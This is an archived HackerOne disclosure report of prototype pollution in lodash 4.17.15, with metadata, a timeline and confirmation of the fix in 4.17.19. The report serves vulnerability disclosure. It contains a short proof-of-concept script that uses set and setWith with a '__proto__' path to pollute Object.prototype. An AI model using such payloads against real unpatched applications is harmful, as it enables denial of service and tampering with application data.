---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2020-08-21
submitted: 2020-05-02T11:10:22.062Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "awarau"
source: "https://hackerone.com/reports/864701"
title: "Prototype Pollution lodash 4.17.15"
---
# Prototype Pollution lodash 4.17.15

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 9 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-21

- Report: [https://hackerone.com/reports/864701](https://hackerone.com/reports/864701)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2020-05-02T11:10:22.062Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Prototype Pollution in lodash version 4.17.15
It allows Denial of Service and more. 

# Module
**module name:** lodash
**version:** 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

27M in the last week

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:
1. Create a JS file with this contents:

lod = require('lodash')
lod.setWith({}, "__proto__[test]", "123")
lod.set({}, "__proto__[test2]", "456")
console.log(test)
console.log(test2)

2. Execute it with node
3. Observe that test and test2 are now on the Object.prototype.

## Supporting Material/References:

This is a variation on:
https://hackerone.com/reports/380873

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

test and test2 could just have easily been toString(). This would allow an attacker to cause a denial of service as all objects inherit from the Object.prototype. 
Additionally, if there are sensitive variables and attributes in a particular application, these can be controlled via the prototype.

## Timeline

- **Report Filed**
- **2020-05-02** @awarau: sorry, it should be <twounderscores>proto<twounderscores> 
I haven't worked out the code formatting here yet lol.
- **2020-05-02** @nochnoidozor: Hi @awarau,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Needs More Info**
- **Report New**
- **2020-05-03** @awarau: I believe you couldn't reproduce it because I'm an idiot and didn't format the PoC correctly. Please try the most recent PoC - with correct formatting. Thank you.
- **2020-05-03** @awarau: If this proves valid, can you also please change the severity from medium to high, to reflect the related bugs and their severity on other reports? Thanks
- **Report Severity Updated**
- **Report Triaged**
- **2020-05-06** @awarau: Awesome. Thanks a bunch @nochnoidozor
- **2020-05-26** @awarau: Is there any update on this? Cheers
- **2020-05-26** @marcinhoppe: @awarau we really appreciate your patience. We are currently working with the maintainer on planning the fix.
- **2020-05-26** @awarau: @marcinhoppe no problem at all! :)
- **2020-07-06** @awarau: Hey is there any plan for a fix? :)
- **2020-07-20** @marcinhoppe: @awarau I can no longer reproduce this with 4.17.19. Can you verify this vulnerability has been properly fixed?
- **2020-07-22** @awarau: Yes! It is indeed fixed. 

```
console.log(test)
            ^

ReferenceError: test is not defined
    at Object.<anonymous> (/Users/apple/Desktop/Programming/bruh.js:4:13)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:71:12)
    at internal/main/run_main_module.js:17:47
```
- **Report Resolved**
- **Agreed On Going Public**
- **2020-07-22** @awarau: Awesome work. May I ask, was this eligible for a bounty?
Cheers
- **Bounty Awarded**
- **Report Became Public**
